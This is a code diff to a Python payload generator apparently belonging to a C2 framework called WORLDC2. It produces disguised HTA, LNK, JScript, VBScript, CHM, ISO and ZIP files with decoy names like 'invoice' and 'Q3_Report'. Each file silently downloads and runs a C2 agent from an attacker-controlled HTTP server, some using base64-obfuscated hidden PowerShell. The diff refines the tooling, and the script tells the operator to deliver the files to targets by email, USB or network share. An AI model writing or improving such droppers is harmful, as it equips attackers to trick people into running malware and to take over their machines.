@@ -18,8 +18,7 @@ Usage:
     python3 autoexec.py --format lnk --server 192.168.1.100:8443 --icon pdf
 """
 
-import os
-import sys
+import secrets
 import base64
 import argparse
 from pathlib import Path
@@ -28,9 +27,13 @@ from datetime import datetime
 GREEN = "\033[92m"; RED = "\033[91m"; YELLOW = "\033[93m"
 CYAN = "\033[96m"; BOLD = "\033[1m"; RESET = "\033[0m"
 
-PROJECT_ROOT = Path(__file__).parent.parent
+PROJECT_ROOT = Path(__file__).resolve().parent.parent
 OUTPUT_DIR = PROJECT_ROOT / "payloads" / "autoexec"
 OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
+
+# Port of the HTTP delivery server that hosts worldc2-agent.exe.
+# Configurable via --http-port; generated artifacts interpolate this port.
+DELIVERY_PORT = 8000
 
 def banner():
     print(f"""{BOLD}{CYAN}
@@ -39,14 +42,18 @@ def banner():
    ╚══════════════════════════════════════════════╝
 {RESET}""")
 
+def _server_host(server):
+    """Extract the host part from an IP:port server address."""
+    return server.rsplit(":", 1)[0] if ":" in server else server
+
 def generate_hta(server, name=None):
     """HTA — runs automatically when opened via mshta.exe"""
     out = OUTPUT_DIR / (name or f"invoice_{datetime.now():%Y%m%d}.hta")
-    
-    host, _, port = server.rsplit(":", 1) if ":" in server else (server, "", "8443")
-    
+
+    host = _server_host(server)
+
     # PowerShell one-liner that downloads and executes the agent
-    ps_cmd = f"""powershell -w hidden -c "$c=New-Object Net.WebClient;$c.DownloadFile('http://{host}:8000/worldc2-agent.exe','$env:TEMP\\\\.update.exe');Start-Process -WindowStyle Hidden '$env:TEMP\\\\.update.exe' -ArgumentList '--server','{server}'"
+    ps_cmd = f"""powershell -w hidden -c "$c=New-Object Net.WebClient;$c.DownloadFile('http://{host}:{DELIVERY_PORT}/worldc2-agent.exe','$env:TEMP\\\\.update.exe');Start-Process -WindowStyle Hidden '$env:TEMP\\\\.update.exe' -ArgumentList '--server','{server}'"
 """
     
     # Base64 encode for obfuscation
@@ -86,68 +93,51 @@ End Sub
     print(f"  {YELLOW}Execution:{RESET} Double-click → mshta.exe auto-runs")
     return out
 
-def generate_lnk(server, name=None, icon="pdf"):
-    """LNK — Windows shortcut that executes payload when clicked"""
-    out = OUTPUT_DIR / (name or f"Q3_Report_{datetime.now():%Y%m%d}.lnk")
-    
-    host, _, port = server.rsplit(":", 1) if ":" in server else (server, "", "8443")
-    
-    # PowerShell command to download and execute
-    ps_cmd = f'powershell -w hidden -c "Invoke-WebRequest -Uri http://{host}:8000/worldc2-agent.exe -OutFile $env:TEMP\\\\.svc.exe; Start-Process -WindowStyle Hidden $env:TEMP\\\\.svc.exe -ArgumentList \'--server\',\'{server}\'"'
-    
-    # LNK binary format (simplified)
-    # This creates a minimal LNK file that runs the command
-    lnk_data = create_lnk_binary(ps_cmd, icon)
-    
-    out.write_bytes(lnk_data)
+def generate_lnk_creator(server, name=None, icon="pdf"):
+    """Generate a PowerShell script that builds a real .lnk shortcut on Windows.
+
+    A .lnk is a binary OLE format: it cannot be written as text from Linux.
+    We emit an honest .ps1 creator (run on a Windows host) instead of a renamed
+    .ps1 file posing as a shortcut.
+    """
+    host = _server_host(server)
+    lnk_name = Path(name).stem if name else f"Q3_Report_{datetime.now():%Y%m%d}"
+    out = OUTPUT_DIR / f"{lnk_name}_lnk_creator.ps1"
+
+    # Download-and-execute command (single-quoted PS literals only)
+    ps_cmd = (f"$c=New-Object Net.WebClient;$t=$env:TEMP+'.svc.exe';"
+              f"$c.DownloadFile('http://{host}:{DELIVERY_PORT}/worldc2-agent.exe',$t);"
+              f"Start-Process -WindowStyle Hidden $t -ArgumentList '--server','{server}'")
+    # Escape single quotes for embedding inside a PS single-quoted string
+    ps_cmd_escaped = ps_cmd.replace("'", "''")
+
+    creator = f"""# WORLDC2 LNK Creator — run on a Windows host to build {lnk_name}.lnk
+# Usage: powershell -ExecutionPolicy Bypass -File {out.name}
+# Note: a real .lnk is a binary OLE format, so it is created via WScript.Shell.
+$shell = New-Object -ComObject WScript.Shell
+$shortcut = $shell.CreateShortcut("$env:USERPROFILE\\Desktop\\{lnk_name}.lnk")
+$shortcut.TargetPath = "powershell.exe"
+$shortcut.Arguments = '-w hidden -c "{ps_cmd_escaped}"'
+$shortcut.WindowStyle = 7
+$shortcut.IconLocation = "%SystemRoot%\\System32\\imageres.dll,-101"
+$shortcut.Save()
+Write-Host "Shortcut created: $env:USERPROFILE\\Desktop\\{lnk_name}.lnk"
+"""
+
+    out.write_text(creator)
     size = out.stat().st_size
-    print(f"{GREEN}[✓]{RESET} LNK: {out.name} ({size} B)")
+    print(f"{GREEN}[✓]{RESET} LNK creator (PS1): {out.name} ({size} B)")
+    print(f"  {YELLOW}Build:{RESET} Run on Windows: powershell -ExecutionPolicy Bypass -File {out.name}")
     print(f"  {YELLOW}Icon:{RESET} {icon}")
-    print(f"  {YELLOW}Delivery:{RESET} USB drop, network share, email")
-    print(f"  {YELLOW}Execution:{RESET} Click or browse folder (icon preview)")
+    print(f"  {YELLOW}Delivery:{RESET} Build the .lnk on Windows, then USB drop / network share / email")
     return out
 
-def create_lnk_binary(command, icon):
-    """Create a minimal LNK file binary."""
-    # LNK header
-    header = bytes([
-        0x4C, 0x00, 0x00, 0x00,  # Header size (76 bytes)
-        0x01, 0x14, 0x02, 0x00,  # LinkCLSID
-        0x00, 0x00, 0x00, 0x00,
-        0x00, 0x00, 0x00, 0x00,  # LinkFlags (HasArguments, IsUnicode)
-        0x00, 0x00, 0x00, 0x00,
-        0x00, 0x00, 0x00, 0x00,
-        0x00, 0x00, 0x00, 0x00,
-        0x00, 0x00, 0x00, 0x00,
-        0x00, 0x00, 0x00, 0x00,
-        0x00, 0x00, 0x00, 0x00,
-        0x00, 0x00, 0x00, 0x00,
-        0x00, 0x00, 0x00, 0x00,
-        0x00, 0x00, 0x00, 0x00,
-        0x00, 0x00, 0x00, 0x00,
-        0x00, 0x00, 0x00, 0x00,
-        0x00, 0x00, 0x00, 0x00,
-        0x00, 0x00, 0x00, 0x00,
-        0x00, 0x00, 0x00, 0x00,
-        0x00, 0x00, 0x00, 0x00,
-    ])
-    
-    # For a proper LNK, we'd need the full binary format
-    # Instead, create a PowerShell script that generates the LNK
-    ps_generator = f"""$WshShell = New-Object -comObject WScript.Shell
-$Shortcut = $WshShell.CreateShortcut("$OUTPUT_DIR\\{name or 'payload'}.lnk")
-$Shortcut.TargetPath = "powershell.exe"
-$Shortcut.Arguments = "-w hidden -c \\"{command}\\""
-$Shortcut.IconLocation = "%SystemRoot%\\System32\\imageres.dll,-101"
-$Shortcut.Save()
-"""
-    return ps_generator.encode('utf-16-le')
 
 def generate_js(server, name=None):
     """JScript — runs via wscript/cscript, no console window"""
     out = OUTPUT_DIR / (name or f"update_check_{datetime.now():%Y%m%d}.js")
-    
-    host, _, port = server.rsplit(":", 1) if ":" in server else (server, "", "8443")
+
+    host = _server_host(server)
     
     js = f"""// WORLDC2 Auto-Execution JScript
 var wsh = new ActiveXObject("WScript.Shell");
@@ -157,7 +147,7 @@ var exe = temp + "\\\\.svc.exe";
 
 try {{
     var http = new ActiveXObject("MSXML2.XMLHTTP");
-    http.open("GET", "http://{host}:8000/worldc2-agent.exe", false);
+    http.open("GET", "http://{host}:{DELIVERY_PORT}/worldc2-agent.exe", false);
     http.send();
     
     if (http.status === 200) {{
@@ -182,19 +172,18 @@ try {{
 def generate_vbs(server, name=None):
     """VBScript — auto-runs when double-clicked"""
     out = OUTPUT_DIR / (name or f"system_update_{datetime.now():%Y%m%d}.vbs")
-    
-    host, _, port = server.rsplit(":", 1) if ":" in server else (server, "", "8443")
-    
-    vbs = """' WORLDC2 Auto-Execution VBScript
+
+    host = _server_host(server)
+
+    vbs = f"""' WORLDC2 Auto-Execution VBScript
 Set wsh = CreateObject("WScript.Shell")
-Set fso = CreateObject("Scripting.FileSystemObject")
 Set http = CreateObject("MSXML2.XMLHTTP")
 
 temp = wsh.ExpandEnvironmentStrings("%TEMP%")
 exe = temp & "\\.svc.exe"
 
 On Error Resume Next
-http.open "GET", "http://""" + host + """:8000/worldc2-agent.exe", False
+http.open "GET", "http://{host}:{DELIVERY_PORT}/worldc2-agent.exe", False
 http.send
 
 If http.Status = 200 Then
@@ -204,8 +193,8 @@ If http.Status = 200 Then
     stream.Write http.ResponseBody
     stream.SaveToFile exe, 2
     stream.Close
-    
-    wsh.Run """""" & exe & """""" --server """ + server + """", 0, False
+
+    wsh.Run \"\"\"\" & exe & \"\"\"\" & \" --server {server}\", 0, False
 End If
 """
     
@@ -218,8 +207,8 @@ End If
 def generate_chm(server, name=None):
     """CHM — Compiled HTML Help, auto-runs when opened"""
     out = OUTPUT_DIR / (name or f"help_{datetime.now():%Y%m%d}.chm")
-    
-    host, _, port = server.rsplit(":", 1) if ":" in server else (server, "", "8443")
+
+    host = _server_host(server)
     
     # Create HHP project file
     hhp = f"""[OPTIONS]
@@ -240,7 +229,7 @@ index.html
 """
     
     # HTML with auto-executing script
-    ps_cmd = f'powershell -w hidden -c "iwr http://{host}:8000/worldc2-agent.exe -OutFile $env:TEMP\\\\.svc.exe; Start-Process -WindowStyle Hidden $env:TEMP\\\\.svc.exe -ArgumentList \'--server\',\'{server}\'"'
+    ps_cmd = f'powershell -w hidden -c "iwr http://{host}:{DELIVERY_PORT}/worldc2-agent.exe -OutFile $env:TEMP\\\\.svc.exe; Start-Process -WindowStyle Hidden $env:TEMP\\\\.svc.exe -ArgumentList \'--server\',\'{server}\'"'
     b64 = base64.b64encode(ps_cmd.encode('utf-16-le')).decode()
     
     html = f"""<html>
@@ -286,9 +275,7 @@ End Sub
 def generate_iso(server, name=None):
     """ISO — Disk image with auto-executing payload"""
     out = OUTPUT_DIR / (name or f"documents_{datetime.now():%Y%m%d}.iso")
-    
-    host, _, port = server.rsplit(":", 1) if ":" in server else (server, "", "8443")
-    
+
     # Create a directory with the payload
     iso_dir = OUTPUT_DIR / "iso_build"
     iso_dir.mkdir(exist_ok=True)
@@ -314,9 +301,7 @@ nohup $(dirname "$0")/worldc2-agent --server {server} &>/dev/null &
 def generate_zip(server, name=None):
     """ZIP — Password-protected archive with payload"""
     out = OUTPUT_DIR / (name or f"confidential_{datetime.now():%Y%m%d}.zip")
-    
-    host, _, port = server.rsplit(":", 1) if ":" in server else (server, "", "8443")
-    
+
     # Create directory with payload
     zip_dir = OUTPUT_DIR / "zip_build"
     zip_dir.mkdir(exist_ok=True)
@@ -332,7 +317,8 @@ start /b worldc2-agent.exe --server {server}
 start "" "Invoice.pdf"
 """)
     
-    password = "Invoice2024!"
+    # Fresh random password per run — never a hardcoded one
+    password = secrets.token_urlsafe(12)
     
     print(f"{GREEN}[✓]{RESET} ZIP build dir: {zip_dir}/")
     print(f"  {YELLOW}Build:{RESET} 7z a -p{password} {out.name} {zip_dir}/*")
@@ -346,9 +332,13 @@ def main():
     parser = argparse.ArgumentParser(description="WORLDC2 Auto-Execution Payload Generator")
     parser.add_argument("--format", "-f", choices=["hta", "lnk", "js", "vbs", "chm", "iso", "zip", "all"], required=True)
     parser.add_argument("--server", "-s", default=None, help="C2 server address")
+    parser.add_argument("--http-port", type=int, default=8000, help="HTTP delivery server port (default: 8000)")
     parser.add_argument("--icon", default="pdf", help="Icon for LNK (pdf, word, excel, folder)")
     args = parser.parse_args()
-    
+
+    global DELIVERY_PORT
+    DELIVERY_PORT = args.http_port
+
     # Auto-detect server
     if not args.server:
         import socket
@@ -357,7 +347,8 @@ def main():
             s.connect(("8.8.8.8", 80))
             args.server = s.getsockname()[0] + ":8443"
             s.close()
-        except:
+        except OSError as e:
+            print(f"{YELLOW}[!] IP auto-detect failed ({e}); using 127.0.0.1:8443{RESET}")
             args.server = "127.0.0.1:8443"
     
     print(f"{BOLD}Server:{RESET} {GREEN}{args.server}{RESET}\n")
@@ -369,7 +360,7 @@ def main():
         if fmt == "hta":
             generate_hta(args.server)
         elif fmt == "lnk":
-            generate_lnk(args.server, icon=args.icon)
+            generate_lnk_creator(args.server, icon=args.icon)
         elif fmt == "js":
             generate_js(args.server)
         elif fmt == "vbs":
@@ -383,7 +374,7 @@ def main():
     
     print(f"\n{BOLD}{GREEN}Done!{RESET} → {OUTPUT_DIR}/")
     print(f"\n{YELLOW}Next steps:{RESET}")
-    print(f"  1. Serve payloads: cd {OUTPUT_DIR} && python3 -m http.server 8000")
+    print(f"  1. Serve payloads: cd {OUTPUT_DIR} && python3 -m http.server {DELIVERY_PORT}")
     print(f"  2. Deliver to target via email, USB, or network share")
     print(f"  3. Wait for connection in C2 dashboard")
 
